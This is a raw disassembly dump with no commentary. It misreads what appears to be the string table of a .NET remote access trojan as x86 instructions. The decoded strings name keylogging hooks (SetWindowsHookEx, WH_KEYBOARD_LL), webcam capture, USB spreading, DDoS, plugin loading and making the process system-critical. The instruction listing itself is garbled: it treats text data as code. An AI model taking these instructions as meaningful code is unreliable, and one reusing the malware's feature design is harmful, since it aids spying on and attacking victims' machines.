  408bef:	53                   	push   %ebx
  408bf0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408bf2:	64 00 6d 73          	add    %ch,%fs:0x73(%ebp)
  408bf6:	67 00 45 6e          	add    %al,0x6e(%di)
  408bfa:	64 53                	fs push %ebx
  408bfc:	65 6e                	outsb  %gs:(%esi),(%dx)
  408bfe:	64 00 69 73          	add    %ch,%fs:0x73(%ecx)
  408c02:	44                   	inc    %esp
  408c03:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  408c0a:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  408c0e:	00 50 6f             	add    %dl,0x6f(%eax)
  408c11:	6e                   	outsb  %ds:(%esi),(%dx)
  408c12:	67 00 6f 62          	add    %ch,0x62(%bx)
  408c16:	6a 00                	push   $0x0
  408c18:	50                   	push   %eax
  408c19:	69 6e 67 00 50 61 63 	imul   $0x63615000,0x67(%esi),%ebp
  408c20:	6b 00 52             	imul   $0x52,(%eax),%eax
  408c23:	65 61                	gs popa
  408c25:	64 00 52 53          	add    %dl,%fs:0x53(%edx)
  408c29:	00 50 6c             	add    %dl,0x6c(%eax)
  408c2c:	75 67                	jne    0x408c95
  408c2e:	69 6e 00 42 00 53 65 	imul   $0x65530042,0x0(%esi),%ebp
  408c35:	6e                   	outsb  %ds:(%esi),(%dx)
  408c36:	64 4d                	fs dec %ebp
  408c38:	53                   	push   %ebx
  408c39:	47                   	inc    %edi
  408c3a:	00 53 65             	add    %dl,0x65(%ebx)
  408c3d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3e:	64 45                	fs inc %ebp
  408c40:	72 72                	jb     0x408cb4
  408c42:	6f                   	outsl  %ds:(%esi),(%dx)
  408c43:	72 00                	jb     0x408c45
  408c45:	54                   	push   %esp
  408c46:	68 72 65 61 64       	push   $0x64616572
  408c4b:	00 44 44 6f          	add    %al,0x6f(%esp,%eax,2)
  408c4f:	73 00                	jae    0x408c51
  408c51:	52                   	push   %edx
  408c52:	65 70 6f             	gs jo  0x408cc4
  408c55:	72 74                	jb     0x408ccb
  408c57:	57                   	push   %edi
  408c58:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  408c5f:	44                   	inc    %esp
  408c60:	00 49 6e             	add    %cl,0x6e(%ecx)
  408c63:	70 75                	jo     0x408cda
  408c65:	74 00                	je     0x408c67
  408c67:	4d                   	dec    %ebp
  408c68:	6f                   	outsl  %ds:(%esi),(%dx)
  408c69:	6e                   	outsb  %ds:(%esi),(%dx)
  408c6a:	69 74 6f 72 69 6e 67 	imul   $0x676e69,0x72(%edi,%ebp,2),%esi
  408c71:	00 
  408c72:	44                   	inc    %esp
  408c73:	61                   	popa
  408c74:	74 61                	je     0x408cd7
  408c76:	00 4f 70             	add    %cl,0x70(%edi)
  408c79:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c7b:	55                   	push   %ebp
  408c7c:	72 6c                	jb     0x408cea
  408c7e:	00 55 72             	add    %dl,0x72(%ebp)
  408c81:	6c                   	insb   (%dx),%es:(%edi)
  408c82:	00 48 69             	add    %cl,0x69(%eax)
  408c85:	64 64 65 6e          	fs fs outsb %gs:(%esi),(%dx)
  408c89:	00 63 61             	add    %ah,0x61(%ebx)
  408c8c:	70 43                	jo     0x408cd1
  408c8e:	72 65                	jb     0x408cf5
  408c90:	61                   	popa
  408c91:	74 65                	je     0x408cf8
  408c93:	43                   	inc    %ebx
  408c94:	61                   	popa
  408c95:	70 74                	jo     0x408d0b
  408c97:	75 72                	jne    0x408d0b
  408c99:	65 57                	gs push %edi
  408c9b:	69 6e 64 6f 77 41 00 	imul   $0x41776f,0x64(%esi),%ebp
  408ca2:	6c                   	insb   (%dx),%es:(%edi)
  408ca3:	70 73                	jo     0x408d18
  408ca5:	7a 57                	jp     0x408cfe
  408ca7:	69 6e 64 6f 77 4e 61 	imul   $0x614e776f,0x64(%esi),%ebp
  408cae:	6d                   	insl   (%dx),%es:(%edi)
  408caf:	65 00 64 77 53       	add    %ah,%gs:0x53(%edi,%esi,2)
  408cb4:	74 79                	je     0x408d2f
  408cb6:	6c                   	insb   (%dx),%es:(%edi)
  408cb7:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  408cbb:	59                   	pop    %ecx
  408cbc:	00 6e 57             	add    %ch,0x57(%esi)
  408cbf:	69 64 74 68 00 6e 48 	imul   $0x65486e00,0x68(%esp,%esi,2),%esp
  408cc6:	65 
  408cc7:	69 67 68 74 00 68 77 	imul   $0x77680074,0x68(%edi),%esp
  408cce:	6e                   	outsb  %ds:(%esi),(%dx)
  408ccf:	64 50                	fs push %eax
  408cd1:	61                   	popa
  408cd2:	72 65                	jb     0x408d39
  408cd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd5:	74 00                	je     0x408cd7
  408cd7:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd8:	49                   	dec    %ecx
  408cd9:	44                   	inc    %esp
  408cda:	00 48 61             	add    %cl,0x61(%eax)
  408cdd:	6e                   	outsb  %ds:(%esi),(%dx)
  408cde:	64 6c                	fs insb (%dx),%es:(%edi)
  408ce0:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  408ce4:	70 47                	jo     0x408d2d
  408ce6:	65 74 44             	gs je  0x408d2d
  408ce9:	72 69                	jb     0x408d54
  408ceb:	76 65                	jbe    0x408d52
  408ced:	72 44                	jb     0x408d33
  408cef:	65 73 63             	gs jae 0x408d55
  408cf2:	72 69                	jb     0x408d5d
  408cf4:	70 74                	jo     0x408d6a
  408cf6:	69 6f 6e 41 00 77 44 	imul   $0x44770041,0x6e(%edi),%ebp
  408cfd:	72 69                	jb     0x408d68
  408cff:	76 65                	jbe    0x408d66
  408d01:	72 00                	jb     0x408d03
  408d03:	6c                   	insb   (%dx),%es:(%edi)
  408d04:	70 73                	jo     0x408d79
  408d06:	7a 4e                	jp     0x408d56
  408d08:	61                   	popa
  408d09:	6d                   	insl   (%dx),%es:(%edi)
  408d0a:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  408d0e:	4e                   	dec    %esi
  408d0f:	61                   	popa
  408d10:	6d                   	insl   (%dx),%es:(%edi)
  408d11:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
  408d16:	7a 56                	jp     0x408d6e
  408d18:	65 72 00             	gs jb  0x408d1b
  408d1b:	63 62 56             	arpl   %esp,0x56(%edx)
  408d1e:	65 72 00             	gs jb  0x408d21
  408d21:	43                   	inc    %ebx
  408d22:	61                   	popa
  408d23:	6d                   	insl   (%dx),%es:(%edi)
  408d24:	00 52 75             	add    %dl,0x75(%edx)
  408d27:	6e                   	outsb  %ds:(%esi),(%dx)
  408d28:	44                   	inc    %esp
  408d29:	69 73 6b 00 45 78 74 	imul   $0x74784500,0x6b(%ebx),%esi
  408d30:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d32:	73 69                	jae    0x408d9d
  408d34:	6f                   	outsl  %ds:(%esi),(%dx)
  408d35:	6e                   	outsb  %ds:(%esi),(%dx)
  408d36:	00 4d 65             	add    %cl,0x65(%ebp)
  408d39:	6d                   	insl   (%dx),%es:(%edi)
  408d3a:	6f                   	outsl  %ds:(%esi),(%dx)
  408d3b:	72 79                	jb     0x408db6
  408d3d:	00 62 75             	add    %ah,0x75(%edx)
  408d40:	66 66 65 72 00       	data16 data16 gs jb 0x408d45
  408d45:	55                   	push   %ebp
  408d46:	4e                   	dec    %esi
  408d47:	53                   	push   %ebx
  408d48:	00 49 73             	add    %cl,0x73(%ecx)
  408d4b:	55                   	push   %ebp
  408d4c:	70 64                	jo     0x408db2
  408d4e:	61                   	popa
  408d4f:	74 65                	je     0x408db6
  408d51:	00 53 74             	add    %dl,0x74(%ebx)
  408d54:	72 00                	jb     0x408d56
  408d56:	55                   	push   %ebp
  408d57:	53                   	push   %ebx
  408d58:	42                   	inc    %edx
  408d59:	54                   	push   %esp
  408d5a:	68 72 65 61 64       	push   $0x64616572
  408d5f:	00 55 53             	add    %dl,0x53(%ebp)
  408d62:	42                   	inc    %edx
  408d63:	53                   	push   %ebx
  408d64:	74 61                	je     0x408dc7
  408d66:	72 74                	jb     0x408ddc
  408d68:	00 55 53             	add    %dl,0x53(%ebp)
  408d6b:	42                   	inc    %edx
  408d6c:	53                   	push   %ebx
  408d6d:	74 6f                	je     0x408dde
  408d6f:	70 00                	jo     0x408d71
  408d71:	55                   	push   %ebp
  408d72:	53                   	push   %ebx
  408d73:	42                   	inc    %edx
  408d74:	43                   	inc    %ebx
  408d75:	6f                   	outsl  %ds:(%esi),(%dx)
  408d76:	64 65 00 43 75       	fs add %al,%gs:0x75(%ebx)
  408d7b:	72 72                	jb     0x408def
  408d7d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d7f:	74 41                	je     0x408dc2
  408d81:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d85:	65 57                	gs push %edi
  408d87:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  408d8e:	74 6c                	je     0x408dfc
  408d90:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  408d94:	6c                   	insb   (%dx),%es:(%edi)
  408d95:	6c                   	insb   (%dx),%es:(%edi)
  408d96:	6b 00 53             	imul   $0x53,(%eax),%eax
  408d99:	65 74 48             	gs je  0x408de4
  408d9c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d9d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d9e:	6b 00 70             	imul   $0x70,(%eax),%eax
  408da1:	72 6f                	jb     0x408e12
  408da3:	63 00                	arpl   %eax,(%eax)
  408da5:	48                   	dec    %eax
  408da6:	6f                   	outsl  %ds:(%esi),(%dx)
  408da7:	6f                   	outsl  %ds:(%esi),(%dx)
  408da8:	6b 43 61 6c          	imul   $0x6c,0x61(%ebx),%eax
  408dac:	6c                   	insb   (%dx),%es:(%edi)
  408dad:	62 61 63             	bound  %esp,0x63(%ecx)
  408db0:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  408db3:	43                   	inc    %ebx
  408db4:	6f                   	outsl  %ds:(%esi),(%dx)
  408db5:	64 65 00 77 50       	fs add %dh,%gs:0x50(%edi)
  408dba:	61                   	popa
  408dbb:	72 61                	jb     0x408e1e
  408dbd:	6d                   	insl   (%dx),%es:(%edi)
  408dbe:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  408dc2:	72 61                	jb     0x408e25
  408dc4:	6d                   	insl   (%dx),%es:(%edi)
  408dc5:	00 4b 65             	add    %cl,0x65(%ebx)
  408dc8:	79 62                	jns    0x408e2c
  408dca:	6f                   	outsl  %ds:(%esi),(%dx)
  408dcb:	61                   	popa
  408dcc:	72 64                	jb     0x408e32
  408dce:	4c                   	dec    %esp
  408dcf:	61                   	popa
  408dd0:	79 6f                	jns    0x408e41
  408dd2:	75 74                	jne    0x408e48
  408dd4:	00 76 6b             	add    %dh,0x6b(%esi)
  408dd7:	43                   	inc    %ebx
  408dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd9:	64 65 00 47 65       	fs add %al,%gs:0x65(%edi)
  408dde:	74 41                	je     0x408e21
  408de0:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408de4:	65 57                	gs push %edi
  408de6:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  408ded:	74 6c                	je     0x408e5b
  408def:	65 00 57 4d          	add    %dl,%gs:0x4d(%edi)
  408df3:	5f                   	pop    %edi
  408df4:	4b                   	dec    %ebx
  408df5:	45                   	inc    %ebp
  408df6:	59                   	pop    %ecx
  408df7:	44                   	inc    %esp
  408df8:	4f                   	dec    %edi
  408df9:	57                   	push   %edi
  408dfa:	4e                   	dec    %esi
  408dfb:	00 5f 70             	add    %bl,0x70(%edi)
  408dfe:	72 6f                	jb     0x408e6f
  408e00:	63 00                	arpl   %eax,(%eax)
  408e02:	5f                   	pop    %edi
  408e03:	68 6f 6f 6b 49       	push   $0x496b6f6f
  408e08:	44                   	inc    %esp
  408e09:	00 53 65             	add    %dl,0x65(%ebx)
  408e0c:	74 57                	je     0x408e65
  408e0e:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  408e15:	6f                   	outsl  %ds:(%esi),(%dx)
  408e16:	6f                   	outsl  %ds:(%esi),(%dx)
  408e17:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  408e1b:	69 64 48 6f 6f 6b 00 	imul   $0x6c006b6f,0x6f(%eax,%ecx,2),%esp
  408e22:	6c 
  408e23:	70 66                	jo     0x408e8b
  408e25:	6e                   	outsb  %ds:(%esi),(%dx)
  408e26:	00 68 4d             	add    %ch,0x4d(%eax)
  408e29:	6f                   	outsl  %ds:(%esi),(%dx)
  408e2a:	64 00 64 77 54       	add    %ah,%fs:0x54(%edi,%esi,2)
  408e2f:	68 72 65 61 64       	push   $0x64616572
  408e34:	49                   	dec    %ecx
  408e35:	64 00 55 6e          	add    %dl,%fs:0x6e(%ebp)
  408e39:	68 6f 6f 6b 57       	push   $0x576b6f6f
  408e3e:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  408e45:	6f                   	outsl  %ds:(%esi),(%dx)
  408e46:	6f                   	outsl  %ds:(%esi),(%dx)
  408e47:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  408e4b:	68 68 6b 00 43       	push   $0x43006b68
  408e50:	61                   	popa
  408e51:	6c                   	insb   (%dx),%es:(%edi)
  408e52:	6c                   	insb   (%dx),%es:(%edi)
  408e53:	4e                   	dec    %esi
  408e54:	65 78 74             	gs js  0x408ecb
  408e57:	48                   	dec    %eax
  408e58:	6f                   	outsl  %ds:(%esi),(%dx)
  408e59:	6f                   	outsl  %ds:(%esi),(%dx)
  408e5a:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  408e5e:	57                   	push   %edi
  408e5f:	48                   	dec    %eax
  408e60:	4b                   	dec    %ebx
  408e61:	45                   	inc    %ebp
  408e62:	59                   	pop    %ecx
  408e63:	42                   	inc    %edx
  408e64:	4f                   	dec    %edi
  408e65:	41                   	inc    %ecx
  408e66:	52                   	push   %edx
  408e67:	44                   	inc    %esp
  408e68:	4c                   	dec    %esp
  408e69:	4c                   	dec    %esp
  408e6a:	00 47 65             	add    %al,0x65(%edi)
  408e6d:	74 46                	je     0x408eb5
  408e6f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e70:	72 65                	jb     0x408ed7
  408e72:	67 72 6f             	addr16 jb 0x408ee4
  408e75:	75 6e                	jne    0x408ee5
  408e77:	64 57                	fs push %edi
  408e79:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  408e80:	65 74 57             	gs je  0x408eda
  408e83:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  408e8a:	72 65                	jb     0x408ef1
  408e8c:	61                   	popa
  408e8d:	64 50                	fs push %eax
  408e8f:	72 6f                	jb     0x408f00
  408e91:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e94:	73 49                	jae    0x408edf
  408e96:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  408e9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408e9b:	64 00 6c 70 64       	add    %ch,%fs:0x64(%eax,%esi,2)
  408ea0:	77 50                	ja     0x408ef2
  408ea2:	72 6f                	jb     0x408f13
  408ea4:	63 65 73             	arpl   %esp,0x73(%ebp)
  408ea7:	73 49                	jae    0x408ef2
  408ea9:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  408ead:	74 4b                	je     0x408efa
  408eaf:	65 79 53             	gs jns 0x408f05
  408eb2:	74 61                	je     0x408f15
  408eb4:	74 65                	je     0x408f1b
  408eb6:	00 6b 65             	add    %ch,0x65(%ebx)
  408eb9:	79 43                	jns    0x408efe
  408ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  408ebc:	64 65 00 47 65       	fs add %al,%gs:0x65(%edi)
  408ec1:	74 4b                	je     0x408f0e
  408ec3:	65 79 62             	gs jns 0x408f28
  408ec6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec7:	61                   	popa
  408ec8:	72 64                	jb     0x408f2e
  408eca:	53                   	push   %ebx
  408ecb:	74 61                	je     0x408f2e
  408ecd:	74 65                	je     0x408f34
  408ecf:	00 6c 70 4b          	add    %ch,0x4b(%eax,%esi,2)
  408ed3:	65 79 53             	gs jns 0x408f29
  408ed6:	74 61                	je     0x408f39
  408ed8:	74 65                	je     0x408f3f
  408eda:	00 47 65             	add    %al,0x65(%edi)
  408edd:	74 4b                	je     0x408f2a
  408edf:	65 79 62             	gs jns 0x408f44
  408ee2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee3:	61                   	popa
  408ee4:	72 64                	jb     0x408f4a
  408ee6:	4c                   	dec    %esp
  408ee7:	61                   	popa
  408ee8:	79 6f                	jns    0x408f59
  408eea:	75 74                	jne    0x408f60
  408eec:	00 69 64             	add    %ch,0x64(%ecx)
  408eef:	54                   	push   %esp
  408ef0:	68 72 65 61 64       	push   $0x64616572
  408ef5:	00 53 79             	add    %dl,0x79(%ebx)
  408ef8:	73 74                	jae    0x408f6e
  408efa:	65 6d                	gs insl (%dx),%es:(%edi)
  408efc:	2e 54                	cs push %esp
  408efe:	65 78 74             	gs js  0x408f75
  408f01:	00 53 74             	add    %dl,0x74(%ebx)
  408f04:	72 69                	jb     0x408f6f
  408f06:	6e                   	outsb  %ds:(%esi),(%dx)
  408f07:	67 42                	addr16 inc %edx
  408f09:	75 69                	jne    0x408f74
  408f0b:	6c                   	insb   (%dx),%es:(%edi)
  408f0c:	64 65 72 00          	fs gs jb 0x408f10
  408f10:	54                   	push   %esp
  408f11:	6f                   	outsl  %ds:(%esi),(%dx)
  408f12:	55                   	push   %ebp
  408f13:	6e                   	outsb  %ds:(%esi),(%dx)
  408f14:	69 63 6f 64 65 45 78 	imul   $0x78456564,0x6f(%ebx),%esp
  408f1b:	00 77 56             	add    %dh,0x56(%edi)
  408f1e:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  408f25:	77 53                	ja     0x408f7a
  408f27:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  408f2a:	43                   	inc    %ebx
  408f2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408f2c:	64 65 00 70 77       	fs add %dh,%gs:0x77(%eax)
  408f31:	73 7a                	jae    0x408fad
  408f33:	42                   	inc    %edx
  408f34:	75 66                	jne    0x408f9c
  408f36:	66 00 63 63          	data16 add %ah,0x63(%ebx)
  408f3a:	68 42 75 66 66       	push   $0x66667542
  408f3f:	00 77 46             	add    %dh,0x46(%edi)
  408f42:	6c                   	insb   (%dx),%es:(%edi)
  408f43:	61                   	popa
  408f44:	67 73 00             	addr16 jae 0x408f47
  408f47:	64 77 68             	fs ja  0x408fb2
  408f4a:	6b 6c 00 4d 61       	imul   $0x61,0x4d(%eax,%eax,1),%ebp
  408f4f:	70 56                	jo     0x408fa7
  408f51:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  408f58:	65 79 00             	gs jns 0x408f5b
  408f5b:	75 43                	jne    0x408fa0
  408f5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408f5e:	64 65 00 75 4d       	fs add %dh,%gs:0x4d(%ebp)
  408f63:	61                   	popa
  408f64:	70 54                	jo     0x408fba
  408f66:	79 70                	jns    0x408fd8
  408f68:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  408f6c:	74 43                	je     0x408fb1
  408f6e:	75 72                	jne    0x408fe2
  408f70:	72 65                	jb     0x408fd7
  408f72:	6e                   	outsb  %ds:(%esi),(%dx)
  408f73:	74 50                	je     0x408fc5
  408f75:	72 6f                	jb     0x408fe6
  408f77:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f7a:	73 49                	jae    0x408fc5
  408f7c:	73 43                	jae    0x408fc1
  408f7e:	72 69                	jb     0x408fe9
  408f80:	74 69                	je     0x408feb
  408f82:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f85:	00 69 73             	add    %ch,0x73(%ecx)
  408f88:	43                   	inc    %ebx
  408f89:	72 69                	jb     0x408ff4
  408f8b:	74 69                	je     0x408ff6
  408f8d:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f90:	00 72 65             	add    %dh,0x65(%edx)
  408f93:	66 57                	push   %di
  408f95:	61                   	popa
  408f96:	73 43                	jae    0x408fdb
  408f98:	72 69                	jb     0x409003
  408f9a:	74 69                	je     0x409005
  408f9c:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f9f:	00 6e 65             	add    %ch,0x65(%esi)
  408fa2:	65 64 53             	gs fs push %ebx
  408fa5:	79 73                	jns    0x40901a
  408fa7:	74 65                	je     0x40900e
  408fa9:	6d                   	insl   (%dx),%es:(%edi)
  408faa:	43                   	inc    %ebx
  408fab:	72 69                	jb     0x409016
  408fad:	74 69                	je     0x409018
  408faf:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408fb2:	42                   	inc    %edx
  408fb3:	72 65                	jb     0x40901a
  408fb5:	61                   	popa
  408fb6:	6b 73 00 4d          	imul   $0x4d,0x0(%ebx),%esi
  408fba:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408fc1:	74 2e                	je     0x408ff1
  408fc3:	57                   	push   %edi
  408fc4:	69 6e 33 32 00 53 65 	imul   $0x65530032,0x33(%esi),%ebp
  408fcb:	73 73                	jae    0x409040
  408fcd:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408fd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd5:	67 45                	addr16 inc %ebp
  408fd7:	76 65                	jbe    0x40903e
  408fd9:	6e                   	outsb  %ds:(%esi),(%dx)
  408fda:	74 41                	je     0x40901d
  408fdc:	72 67                	jb     0x409045
  408fde:	73 00                	jae    0x408fe0
  408fe0:	53                   	push   %ebx
  408fe1:	79 73                	jns    0x409056
  408fe3:	74 65                	je     0x40904a
  408fe5:	6d                   	insl   (%dx),%es:(%edi)
  408fe6:	45                   	inc    %ebp
  408fe7:	76 65                	jbe    0x40904e
  408fe9:	6e                   	outsb  %ds:(%esi),(%dx)
  408fea:	74 73                	je     0x40905f
  408fec:	5f                   	pop    %edi
  408fed:	53                   	push   %ebx
  408fee:	65 73 73             	gs jae 0x409064
  408ff1:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408ff8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff9:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffe:	64 65 72 00          	fs gs jb 0x409002
  409002:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  409006:	69 74 69 63 61 6c 50 	imul   $0x72506c61,0x63(%ecx,%ebp,2),%esi
  40900d:	72 
  40900e:	6f                   	outsl  %ds:(%esi),(%dx)
  40900f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409012:	73 5f                	jae    0x409073
  409014:	45                   	inc    %ebp
  409015:	6e                   	outsb  %ds:(%esi),(%dx)
  409016:	61                   	popa
  409017:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40901b:	43                   	inc    %ebx
  40901c:	72 69                	jb     0x409087
  40901e:	74 69                	je     0x409089
  409020:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409023:	50                   	push   %eax
  409024:	72 6f                	jb     0x409095
  409026:	63 65 73             	arpl   %esp,0x73(%ebp)
  409029:	73 65                	jae    0x409090
  40902b:	73 5f                	jae    0x40908c
  40902d:	44                   	inc    %esp
  40902e:	69 73 61 62 6c 65 00 	imul   $0x656c62,0x61(%ebx),%esi
  409035:	44                   	inc    %esp
  409036:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40903a:	70 74                	jo     0x4090b0
  40903c:	00 69 6e             	add    %ch,0x6e(%ecx)
  40903f:	70 75                	jo     0x4090b6
  409041:	74 00                	je     0x409043
  409043:	50                   	push   %eax
  409044:	72 6f                	jb     0x4090b5
  409046:	63 65 73             	arpl   %esp,0x73(%ebp)
  409049:	73 44                	jae    0x40908f
  40904b:	70 69                	jo     0x4090b6
  40904d:	00 53 65             	add    %dl,0x65(%ebx)
  409050:	74 50                	je     0x4090a2
  409052:	72 6f                	jb     0x4090c3
  409054:	63 65 73             	arpl   %esp,0x73(%ebp)
  409057:	73 44                	jae    0x40909d
  409059:	70 69                	jo     0x4090c4
  40905b:	41                   	inc    %ecx
  40905c:	77 61                	ja     0x4090bf
  40905e:	72 65                	jb     0x4090c5
  409060:	6e                   	outsb  %ds:(%esi),(%dx)
  409061:	65 73 73             	gs jae 0x4090d7
  409064:	00 61 77             	add    %ah,0x77(%ecx)
  409067:	61                   	popa
  409068:	72 65                	jb     0x4090cf
  40906a:	6e                   	outsb  %ds:(%esi),(%dx)
  40906b:	65 73 73             	gs jae 0x4090e1
  40906e:	00 49 73             	add    %cl,0x73(%ecx)
  409071:	56                   	push   %esi
  409072:	61                   	popa
  409073:	6c                   	insb   (%dx),%es:(%edi)
  409074:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  40907b:	6e 
  40907c:	4e                   	dec    %esi
  40907d:	61                   	popa
  40907e:	6d                   	insl   (%dx),%es:(%edi)
  40907f:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  409083:	6d                   	insl   (%dx),%es:(%edi)
  409084:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  409088:	6c                   	insb   (%dx),%es:(%edi)
  409089:	65 53                	gs push %ebx
  40908b:	74 72                	je     0x4090ff
  40908d:	65 61                	gs popa
  40908f:	6d                   	insl   (%dx),%es:(%edi)
  409090:	00 66 69             	add    %ah,0x69(%esi)
  409093:	6c                   	insb   (%dx),%es:(%edi)
  409094:	65 53                	gs push %ebx
  409096:	74 72                	je     0x40910a
  409098:	65 61                	gs popa
  40909a:	6d                   	insl   (%dx),%es:(%edi)
  40909b:	00 41 6c             	add    %al,0x6c(%ecx)
  40909e:	70 68                	jo     0x409108
  4090a0:	61                   	popa
  4090a1:	62 65 74             	bound  %esp,0x74(%ebp)
  4090a4:	00 52 61             	add    %dl,0x61(%edx)
  4090a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4090a8:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090aa:	6d                   	insl   (%dx),%es:(%edi)
  4090ab:	00 50 4c             	add    %dl,0x4c(%eax)
  4090ae:	00 63 75             	add    %ah,0x75(%ebx)
  4090b1:	72 72                	jb     0x409125
  4090b3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090b5:	74 00                	je     0x4090b7
  4090b7:	47                   	inc    %edi
  4090b8:	65 74 52             	gs je  0x40910d
  4090bb:	61                   	popa
  4090bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bd:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090bf:	6d                   	insl   (%dx),%es:(%edi)
  4090c0:	53                   	push   %ebx
  4090c1:	74 72                	je     0x409135
  4090c3:	69 6e 67 00 6c 65 6e 	imul   $0x6e656c00,0x67(%esi),%ebp
  4090ca:	67 74 68             	addr16 je 0x409135
  4090cd:	00 47 65             	add    %al,0x65(%edi)
  4090d0:	74 4c                	je     0x40911e
  4090d2:	61                   	popa
  4090d3:	73 74                	jae    0x409149
  4090d5:	49                   	dec    %ecx
  4090d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d7:	70 75                	jo     0x40914e
  4090d9:	74 49                	je     0x409124
  4090db:	6e                   	outsb  %ds:(%esi),(%dx)
  4090dc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090de:	00 70 6c             	add    %dh,0x6c(%eax)
  4090e1:	69 69 00 69 64 6c 65 	imul   $0x656c6469,0x0(%ecx),%ebp
  4090e8:	74 69                	je     0x409153
  4090ea:	6d                   	insl   (%dx),%es:(%edi)
  4090eb:	65 00 6c 61 73       	add    %ch,%gs:0x73(%ecx,%eiz,2)
  4090f0:	74 49                	je     0x40913b
  4090f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f3:	70 75                	jo     0x40916a
  4090f5:	74 49                	je     0x409140
  4090f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f8:	66 00 47 65          	data16 add %al,0x65(%edi)
  4090fc:	74 4c                	je     0x40914a
  4090fe:	61                   	popa
  4090ff:	73 74                	jae    0x409175
  409101:	49                   	dec    %ecx
  409102:	6e                   	outsb  %ds:(%esi),(%dx)
  409103:	70 75                	jo     0x40917a
  409105:	74 54                	je     0x40915b
  409107:	69 6d 65 00 54 69 6d 	imul   $0x6d695400,0x65(%ebp),%ebp
  40910e:	65 53                	gs push %ebx
  409110:	70 61                	jo     0x409173
  409112:	6e                   	outsb  %ds:(%esi),(%dx)
  409113:	00 73 75             	add    %dh,0x75(%ebx)
  409116:	6d                   	insl   (%dx),%es:(%edi)
  409117:	6f                   	outsl  %ds:(%esi),(%dx)
  409118:	66 69 64 6c 65 74 69 	imul   $0x6974,0x65(%esp,%ebp,2),%sp
  40911f:	6d                   	insl   (%dx),%es:(%edi)
  409120:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  409125:	74 4c                	je     0x409173
  409127:	61                   	popa
  409128:	73 74                	jae    0x40919e
  40912a:	49                   	dec    %ecx
  40912b:	64 6c                	fs insb (%dx),%es:(%edi)
  40912d:	65 74 69             	gs je  0x409199
  409130:	6d                   	insl   (%dx),%es:(%edi)
